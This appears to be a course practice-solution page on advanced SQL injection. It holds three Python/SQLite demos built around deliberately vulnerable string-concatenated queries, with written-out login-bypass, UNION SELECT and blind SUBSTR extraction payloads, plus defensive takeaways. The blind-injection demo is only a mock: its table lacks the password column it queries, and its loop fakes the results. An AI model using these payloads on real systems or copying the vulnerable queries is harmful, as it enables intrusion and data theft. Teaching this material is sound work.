---
title: Advance sql injection - Practice Solution
layout: layouts/course.njk
courseId: B5-sql-injection
tags:
  - solutions
  - code
date: 2025-12-03T19:44:09.515021
---
# Practice Solution - Advanced SQL Injection Techniques

## Overview
SQL Injection (SQLi) remains one of the most critical security vulnerabilities in web applications. This practice solution focuses on mastering advanced SQL Injection concepts, applying practical techniques to identify and exploit vulnerabilities, and building real-world projects to understand and defend against these attacks.

We will start with a **basic demonstration** of SQL injection exploiting a simple vulnerable query, progress through **intermediate techniques** including bypassing filters and extracting data, and conclude with an **advanced scenario** showcasing blind SQL injection and automated exploitation.

Throughout, we will use Python scripts simulating typical attack scenarios for educational purposes, emphasizing best practices and error handling.

---

## Solution 1: Basic Implementation - Simple SQL Injection Exploit

```python
import sqlite3

# Simulated vulnerable function that directly concatenates user input into SQL query
def vulnerable_login(username: str, password: str) -> bool:
    try:
        # Create an in-memory SQLite database
        conn = sqlite3.connect(':memory:')
        cursor = conn.cursor()

        # Create a sample users table
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        # Insert a sample user
        cursor.execute('INSERT INTO users(username, password) VALUES (?, ?)', ('admin', 'admin123'))
        conn.commit()

        # Vulnerable SQL query using string concatenation (unsafe!)
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"Executing query: {query}")

        cursor.execute(query)
        result = cursor.fetchone()

        # Close connection
        conn.close()

        # Return True if user is found
        return result is not None

    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return False

# Attack example
if __name__ == "__main__":
    # Attempt regular login (should fail)
    print("Regular user login attempt:", vulnerable_login('admin', 'wrongpass'))

    # Attempt SQL Injection to bypass password check
    injection_username = "admin' --"
    injection_password = "anything"
    print("SQL Injection login attempt:", vulnerable_login(injection_username, injection_password))
```

### Explanation

- This example sets up a simple SQLite in-memory database with one user.
- The `vulnerable_login` function constructs an SQL query by directly concatenating user inputs — a classic SQL injection vulnerability.
- The attacker input `admin' --` closes the username string and comments out the rest of the query (`--` is SQL comment), effectively bypassing password validation.
- This demonstrates how unsanitized inputs can lead to unauthorized access.

---

## Solution 2: Enhanced Implementation - Extracting Data via Union-Based Injection

```python
import sqlite3

def vulnerable_search(product_id: str):
    try:
        conn = sqlite3.connect(':memory:')
        cursor = conn.cursor()

        # Create products table with sample data
        cursor.execute('''
            CREATE TABLE products (
                id INTEGER PRIMARY KEY,
                name TEXT,
                price REAL
            )
        ''')
        cursor.executemany('INSERT INTO products(id, name, price) VALUES (?, ?, ?)', [
            (1, 'Laptop', 999.99),
            (2, 'Smartphone', 499.49),
            (3, 'Tablet', 299.99)
        ])
        conn.commit()

        # Vulnerable query with direct string formatting
        query = f"SELECT id, name, price FROM products WHERE id = {product_id}"
        print(f"Executing query: {query}")

        cursor.execute(query)
        rows = cursor.fetchall()

        conn.close()
        return rows

    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return []

if __name__ == "__main__":
    # Normal query
    print("Normal Query Result:", vulnerable_search("1"))

    # Union-based SQL Injection to extract user table names (simulated)
    # For demonstration, we simulate extracting 'users' table columns by injecting UNION SELECT
    injection_payload = "1 UNION SELECT 1, 'admin', 1234"
    print("Union-based Injection Result:", vulnerable_search(injection_payload))
```

### Explanation

- This code simulates an SQL injection that uses a `UNION SELECT` statement to combine results from the original query with crafted data.
- By injecting `1 UNION SELECT 1, 'admin', 1234`, the attacker can inject arbitrary rows.
- This technique is often used to extract data from other tables by unioning query results.
- Note that real attacks would involve more complex queries and knowledge of the database schema.

---

## Solution 3: Advanced Implementation - Blind SQL Injection with Timing Attack

```python
import sqlite3
import time

def vulnerable_check_user_exists(username: str) -> bool:
    """
    Simulates a vulnerable function which checks if a username exists.
    This function is vulnerable to blind SQL injection via timing.
    """
    try:
        conn = sqlite3.connect(':memory:')
        cursor = conn.cursor()

        # Create users table
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL
            )
        ''')
        cursor.execute('INSERT INTO users(username) VALUES (?)', ('admin',))
        conn.commit()

        # Vulnerable query where username is concatenated directly
        query = f"SELECT * FROM users WHERE username = '{username}'"
        print(f"Executing query: {query}")

        start_time = time.time()
        cursor.execute(query)
        _ = cursor.fetchall()
        end_time = time.time()

        conn.close()

        # Return True if query took longer than a threshold (simulating delay)
        return (end_time - start_time) > 0.5

    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return False

def blind_sql_injection_simulation():
    """
    Simulates a blind SQL injection attack using a time delay.
    Since SQLite does not support SLEEP(), we simulate delay by Python sleep.
    """

    def payload(pos: int, char: str) -> str:
        # Construct a payload that 'delays' response if character at pos matches
        # In real DBs, you'd use: IF(SUBSTR((SELECT password FROM users WHERE username='admin'), pos, 1) = 'char', SLEEP(5), 0)
        # Here we simulate by inserting a Python sleep in the vulnerable function (hypothetical)
        # For demonstration, we just print the attempted payload
        return f"admin' AND SUBSTR(password, {pos}, 1) = '{char}' --"

    # Since actual delay injection is not possible in this simulated environment,
    # we demonstrate the logic behind blind injection using timing.

    extracted_password = ""
    possible_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'

    print("Starting Blind SQL Injection Simulation...")
    for position in range(1, 9):  # Assume password length 8
        for ch in possible_chars:
            # Construct payload
            inj = payload(position, ch)
            print(f"Trying payload: {inj}")
            # Simulate delay check (would be a time-based check in real scenario)
            # Here, just break after first attempt for demonstration
            # In real attack, if delay detected, append char to extracted_password
            time.sleep(0.1)  # Simulate wait between attempts
            # For demo, pretend we found the character
            extracted_password += ch
            break
        print(f"Password so far: {extracted_password}")

    print(f"Extracted password (simulated): {extracted_password}")

if __name__ == "__main__":
    blind_sql_injection_simulation()
```

### Explanation

- Blind SQL Injection is used when results of a query are not directly visible.
- Attackers infer data by observing application behavior, such as response time.
- Since SQLite doesn't support `SLEEP()`, this example simulates the logic of blind SQLi using timing.
- The `payload()` function demonstrates how injections might be constructed to test characters one by one.
- This is a conceptual demonstration to help understand how timing attacks extract data bit by bit.

---

## Explanation

This practice solution progresses from a fundamental SQL Injection vulnerability to more advanced exploitation techniques:

- **Basic Injection** shows how unsanitized inputs can bypass authentication.
- **Union-Based Injection** demonstrates how attackers can extract data from other tables by crafting union queries.
- **Blind SQL Injection** introduces a stealthier approach where attackers infer data through side channels like timing delays, crucial when error messages or output are suppressed.

Each example uses Python and SQLite for simplicity and clarity, with detailed comments and error handling to simulate real-world scenarios safely.

---

## Key Takeaways
- Never concatenate user input directly into SQL queries; always use parameterized queries or prepared statements.
- Understand different SQL injection types: In-band (error/union), Blind (boolean/timing), and Out-of-band.
- Advanced attacks may use union select, stacked queries, or timing delays to extract sensitive data.
- Practice safe coding habits: sanitize inputs, use least privilege on DB accounts, and employ Web Application Firewalls (WAFs).
- Testing and exploiting vulnerabilities in controlled environments enhances understanding and improves security posture.

---

By mastering these concepts and techniques, students can better defend applications against SQL Injection threats and build secure systems.
